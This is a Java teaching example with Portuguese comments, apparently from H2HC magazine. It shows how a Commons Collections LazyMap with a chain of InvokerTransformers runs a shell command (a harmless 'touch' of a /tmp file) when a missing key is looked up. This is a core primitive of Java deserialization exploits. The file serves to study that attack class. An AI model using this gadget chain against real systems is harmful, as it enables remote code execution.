import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.*;
import java.lang.reflect.InvocationTargetException;
import java.util.*;

/**
 * Exemplo que demonstra que um Map decorado com um LazyMap e uma ChainedTransformer
 * como factory pode levar a execução de comando (através da invocação a métodos arbitrários
 * via Reflexão) caso seja acessada uma chave inexistente no map.
 * Esse é um dos princípios usados para executar comandos usufruíndo de gadgets que tentam
 * acessar chaves inexistentes em campos (controlados pelos usuários) em seus magic methods.
 *
 * -----------------------------------------------------------------------
 * Mais detalhes na 12a edição da H2HC (hackers to hackers) magazine:
 * https://www.h2hc.com.br/revista/
 * -----------------------------------------------------------------------
 *
 * OBS: Esse código tem fins apenas didáticos. Algumas cadeias de
 * transformers são baseadas nas versões de Chris Frohoff e/ou Matthias Kaiser
 *
 **** USAGE ****
 *
 * Compilando:
 * $ javac -cp .:commons-collections-3.2.1.jar ExampleTransformersWithLazyMap.java
 *
 * Executando
 * $ rm /tmp/h2hc_lazymap
 * $ java -cp .:commons-collections-3.2.1.jar ExampleTransformersWithLazyMap
 * $ ls -all /tmp/h2hc_lazymap
 *
 * @author @joaomatosf
 */
public class ExampleTransformersWithLazyMap {
    @SuppressWarnings ( {"unchecked"} )
    public static void main(String[] args)
            throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, IllegalArgumentException, InvocationTargetException {

        String cmd[] = {"/bin/sh", "-c", "touch /tmp/h2hc_lazymap"}; // Comando a ser executado

        Transformer[] transformers = new Transformer[] {
                // retorna Class Runtime.class
                new ConstantTransformer(Runtime.class),
                // 1o. Objeto InvokerTransformer: .getMethod("getRuntime", new Class[0])
                new InvokerTransformer(
                        "getMethod",                                    // invoca método getMethod
                        ( new Class[] {String.class, Class[].class } ),// tipos dos parâmetros: (String, Class[])
                        ( new Object[] {"getRuntime", new Class[0] } ) // parâmetros: (getRuntime, Class[0])
                ),
                // 2o. Objeto InvokerTransformer: .invoke(null, new Object[0])
                new InvokerTransformer(
                        "invoke",                                      // invoca método: invoke
                        (new Class[] {Object.class, Object[].class }),// tipos dos parâmetros: (Object.class, Object[])
                        (new Object[] {null, new Object[0] })         // parâmetros: (null, new Object[0])
                ),
                // 3o. Objeto InvokerTransformer: .exec(cmd[])
                new InvokerTransformer(
                        "exec",                                       // invoca método: exec
                        new Class[] { String[].class },              // tipos dos parâmetros: (String[])
                        new Object[]{ cmd } )                        // parâmetros: (cmd[])
        };

        // Cria o objeto ChainedTransformer com o array de Transformers:
        Transformer transformerChain = new ChainedTransformer(transformers);
        // Cria o map
        Map map = new HashMap();
        // Decora o map com o LazyMap e a cadeia de transformações como factory
        Map lazyMap = LazyMap.decorate(map,transformerChain);

        lazyMap.get("h2hc2"); // Tenta recuperar uma chave inexistente (BUM)

    }
}